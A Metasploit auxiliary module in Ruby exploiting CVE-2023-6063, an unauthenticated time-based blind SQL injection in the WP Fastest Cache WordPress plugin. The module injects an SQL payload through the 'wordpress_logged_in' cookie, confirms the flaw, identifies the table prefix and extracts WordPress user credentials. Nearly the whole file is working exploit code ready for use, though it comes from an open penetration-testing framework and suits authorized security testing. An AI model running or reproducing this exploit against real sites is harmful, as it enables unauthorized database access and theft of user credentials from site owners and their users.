##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress WP Fastest Cache Unauthenticated SQLi (CVE-2023-6063)',
        'Description' => %q{
          WP Fastest Cache, a WordPress plugin,
          prior to version 1.2.2, is vulnerable to an unauthenticated SQL injection
          vulnerability via the 'wordpress_logged_in' cookie. This can be exploited via a blind SQL injection attack without requiring any authentication.
        },
        'Author' => [
          'Valentin Lobstein', # Metasploit Module
          'Julien Voisin',     # Module Idea
          'Alex Sanford'       # Vulnerability Discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6063'],
          ['URL', 'https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/']
        ],
        'Actions' => [
          ['List Data', { 'Description' => 'Queries database schema for COUNT rows' }]
        ],
        'DefaultAction' => 'List Data',
        'DefaultOptions' => { 'SqliDelay' => '2', 'VERBOSE' => true },
        'DisclosureDate' => '2023-11-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options [
      OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
    ]
  end

  def run_host(ip)
    print_status("Performing SQL injection via the 'wordpress_logged_in' cookie...")

    random_number = Rex::Text.rand_text_numeric(4..8)
    random_table = Rex::Text.rand_text_alpha(4..8)
    random_string = Rex::Text.rand_text_alpha(4..8)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'GET',
        'cookie' => "wordpress_logged_in=\" AND (SELECT #{random_number} FROM (SELECT(#{payload}))#{random_table}) AND \"#{random_string}\"=\"#{random_string}",
        'uri' => normalize_uri(target_uri.path)
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    wordpress_sqli_initialize(@sqli)

    return print_bad("#{peer} - Testing of SQLi failed. If this is time-based, try increasing the SqliDelay.") unless @sqli.test_vulnerable

    table_prefix = wordpress_sqli_identify_table_prefix
    unless table_prefix
      fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
    end

    wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
  end
end
